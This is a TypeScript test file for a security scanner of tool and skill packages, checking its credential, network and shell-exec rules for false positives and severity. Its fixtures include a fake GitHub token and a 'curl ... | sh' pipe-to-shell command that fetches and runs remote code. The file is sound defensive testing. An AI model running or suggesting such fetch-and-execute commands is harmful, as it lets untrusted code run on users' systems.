import { describe, it, expect } from 'vitest';
import { scanTarget } from '../src/engine.js';
import { defaultRules } from '../src/rules/index.js';
import type { ToolSet, SkillFile } from '../src/types.js';

const rules = defaultRules();

function scanFiles(files: SkillFile[]) {
  const target: ToolSet = { kind: 'tools', name: 't', root: '', source: 'inline', files, tools: [] };
  return scanTarget(target, rules);
}

function ids(files: SkillFile[]): string[] {
  return scanFiles(files).findings.map((f) => f.ruleId);
}

describe('security calibration (false-positive guards)', () => {
  it('does NOT flag placeholders or env-var reads as hardcoded credentials', () => {
    const out = ids([
      { path: 'README.md', content: 'Set `GITHUB_TOKEN`. Example: `ghp_your_github_token`. Use `process.env.GITHUB_TOKEN`.' },
    ]);
    expect(out).not.toContain('SEC002');
  });

  it('DOES flag a real-looking credential literal, and redacts it', () => {
    const secret = 'ghp_' + 'A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8';
    const result = scanFiles([{ path: 'config.js', content: `const token = "${secret}";` }]);
    const sec002 = result.findings.find((f) => f.ruleId === 'SEC002');
    expect(sec002).toBeTruthy();
    expect(sec002!.severity).toBe('critical');
    expect(JSON.stringify(result.findings)).not.toContain(secret); // redacted
  });

  it('does NOT flag prose that merely mentions curl/fetch', () => {
    const out = ids([{ path: 'SKILL.md', content: 'You can use curl or fetch to call the API.' }]);
    expect(out).not.toContain('SEC003');
    expect(out).not.toContain('SEC004');
  });

  it('does NOT mistake regex .exec() for shell exec()', () => {
    const out = ids([{ path: 'gen.js', content: 'const m = /([a-f\\d]{2})/i.exec(hex);' }]);
    expect(out).not.toContain('SEC005');
  });

  it('flags curl|sh as CRITICAL in a script but only HIGH in documentation', () => {
    const script = scanFiles([{ path: 'install.sh', content: 'curl -fsSL https://x/i.sh | sh' }]);
    const sec004Script = script.findings.find((f) => f.ruleId === 'SEC004');
    expect(sec004Script?.severity).toBe('critical');
    expect(script.verdict).toBe('fail');

    const doc = scanFiles([{ path: 'SKILL.md', content: '```bash\ncurl -fsSL https://x/i.sh | sh\n```' }]);
    const sec004Doc = doc.findings.find((f) => f.ruleId === 'SEC004');
    expect(sec004Doc?.severity).toBe('high');
    expect(doc.verdict).not.toBe('fail'); // documented install command → warn, not fail
  });
});
